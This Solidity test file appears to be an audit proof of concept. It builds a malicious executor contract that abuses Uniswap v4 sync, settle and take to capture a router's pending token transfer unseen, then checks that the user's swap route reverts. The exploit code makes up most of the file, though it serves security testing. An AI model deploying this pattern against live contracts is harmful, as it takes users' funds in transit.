// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {TransientStateLibrary} from "@uniswap/v4-core/src/libraries/TransientStateLibrary.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";

import {IWthArbitrageExecutor} from "contracts/wth-corrector/IWthArbitrageExecutor.sol";

import {PresyncRouterMock} from "../../wth-corrector/PresyncRouterMock.sol";
import {WthCorrectorTest} from "../../wth-corrector/WthCorrector.t.sol";

contract ResyncExecutor is IWthArbitrageExecutor {
    using TransientStateLibrary for IPoolManager;

    IPoolManager public immutable pm;
    address public immutable corrector;
    uint256 public stolen;

    constructor(IPoolManager _pm, address _corrector) {
        pm = _pm;
        corrector = _corrector;
    }

    receive() external payable {}

    function executeArbitrage(PoolKey calldata key, address, ProfitSplit calldata) external returns (uint256) {
        Currency synced = pm.getSyncedCurrency();
        require(Currency.unwrap(synced) == Currency.unwrap(key.currency1), "no pending sync");
        uint256 pending = synced.balanceOf(address(pm)) - pm.getSyncedReserves();
        pm.settle(); // credits this contract with the router's transfer, clears the synced currency
        pm.take(synced, address(this), pending); // own delta back to zero
        pm.sync(synced); // synced currency back to the coin: the digest sees nothing
        stolen = pending;
        (bool ok,) = corrector.call{value: 1e15}("");
        require(ok, "pay");
        return 0;
    }
}

contract ReservesBypassTest is WthCorrectorTest {
    function test_resync_passesDigest_andRevertsTheRoute() public {
        uint256 coinIn = 1_000_000 ether;
        PresyncRouterMock router = new PresyncRouterMock(poolManager);
        vm.prank(users.buyerOne);
        wCoin.transfer(address(router), coinIn);

        ResyncExecutor ex = new ResyncExecutor(poolManager, address(corrector));
        vm.deal(address(ex), 1 ether);
        vm.prank(users.owner);
        corrector.setExecutor(address(ex));

        try router.roundTrip(plainKey, key, coinIn) {
            revert("route completed");
        } catch (bytes memory err) {
            emit log_bytes(err);
            assertEq(bytes4(err), IPoolManager.CurrencyNotSettled.selector);
        }
    }
}
